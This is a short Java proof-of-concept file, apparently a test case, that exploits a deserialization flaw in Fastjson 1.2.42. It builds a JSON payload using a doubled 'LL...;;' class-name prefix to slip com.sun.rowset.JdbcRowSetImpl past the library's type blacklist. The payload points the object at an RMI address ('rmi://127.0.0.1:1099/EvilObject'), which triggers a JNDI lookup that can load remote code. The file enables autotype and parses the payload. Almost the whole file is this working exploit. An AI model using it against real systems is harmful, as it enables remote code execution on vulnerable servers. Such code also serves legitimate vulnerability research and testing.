import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

//@dependency{fastjson:1.2.42}
public class jdbcrowsetimpl3 {
    public static void main(String args[]) {
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true}";
        ParserConfig config = new ParserConfig();
        config.getGlobalInstance().setAutoTypeSupport(true);
        Object res = JSON.parse(payload);

    }
}
